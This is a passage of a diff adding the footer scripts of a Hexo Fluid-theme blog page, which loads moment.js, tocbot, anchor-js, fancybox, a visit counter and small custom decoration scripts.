+      var reg = /\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:Z|[+-]\d{2}:\d{2})/;
+      var matchs = text.match(reg);
+      if (matchs) {
+        var relativeTime = moment(matchs[0]).fromNow();
+        updatedTime.textContent = text.replace(reg, relativeTime);
+      }
+      updatedTime.style.display = '';
+    }
+  };
+  Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/moment.min.js', function() {
+    if (!'zh-cn'.startsWith('en')) {
+      Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/locale/zh-cn.min.js', function() {
+        relativeDate();
+      });
+    } else {
+      relativeDate();
+    }
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="https://static.kevinchu.top/blog/assets/js/stars.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
